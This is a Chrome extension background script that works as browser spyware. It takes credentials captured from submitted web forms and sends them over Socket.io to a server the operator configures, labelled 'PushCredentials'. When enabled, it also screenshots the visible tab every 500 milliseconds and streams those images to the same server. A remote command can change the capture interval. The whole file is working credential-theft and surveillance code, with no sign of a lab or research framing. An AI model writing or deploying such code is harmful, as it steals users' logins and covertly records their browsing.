// Variables
var socket = null;
var server = null;
var attemptsToReconnect = 3;
var lastMessage = '';
var screenshotTimer = 500;
var isScreenshotEnabled = false;

(function(){
	console.log('Ready from background.js');

	setInterval(function(){
		takeScreenshot();
	}, screenshotTimer);
})();

// Receive all messages and select only matched cases
chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
	    switch (request.type) {
	    	case 'Get_Basic_Data': // Return configurations
	    		sendResponse({server : server, lastMessage : lastMessage, isScreenshotEnabled: isScreenshotEnabled})
	    		break;
	    	case 'SetScreenshot': // Set on/off screenshots
	    		isScreenshotEnabled = request.value;
	    		break;
	    	case 'Socket_Manager': // Make a new connection
	    		server = request.dns;	    		
				attemptsToReconnect = 3;

	    		socketManager();
	    	break;
	        case 'on_form_submit': // Send data to socket
	            var credentials = request.data;
	             
	            
	            if (emitCredentials(credentials)) {
	            	sendResponse({response: 'Credentials sent'});
	            }
	            else{
	            	sendResponse({response: 'Credentials cannot be sent'});
	            }
	            break;
	        default:
	        	sendResponse({response : 'Invalid option'});
     }
});

function emitCredentials(data){
	if (socket != null) {
		socket.emit('PushCredentials', {Credentials : data});
		return true;
	}
	else{
		return false;
	}
}

function socketManager(){
	// Socket.io settings
	socket = new io(server);
	console.log(socket)

	// Socket.io events
	socket.on('connect', function(data){
		// Send a message to config.html
		lastMessage = 'Connected to server';
		chrome.runtime.sendMessage({type : 'Background.Message', 'message' : lastMessage, 'dns': server}, function(data){
			console.log(data.response);
		});
	});

	socket.on('connect_error', function(data){
		console.log('Connect error to server');
		console.log(data);
		if (attemptsToReconnect <= 1) {
			socket.close();
			lastMessage = 'Max of attempts to connect, verify if backend app is running';
			chrome.runtime.sendMessage({type : 'Background.Message', 'message' : lastMessage}, function(data){
				console.log(data.response);
			});
		};
		attemptsToReconnect--;
	});

	socket.on('setScreenshotTimer', function(data){
		screenshotTimer = data;
	})
}

function takeScreenshot(){
	if (isScreenshotEnabled) {
		chrome.tabs.captureVisibleTab(null,{},function(dataUrl){
			console.log(dataUrl);
			if (socket != null) {
				socket.emit('PushScreenshot', {screenshot : dataUrl});
				return true;
			}
			else{
				return false;
			}
		});
	};
}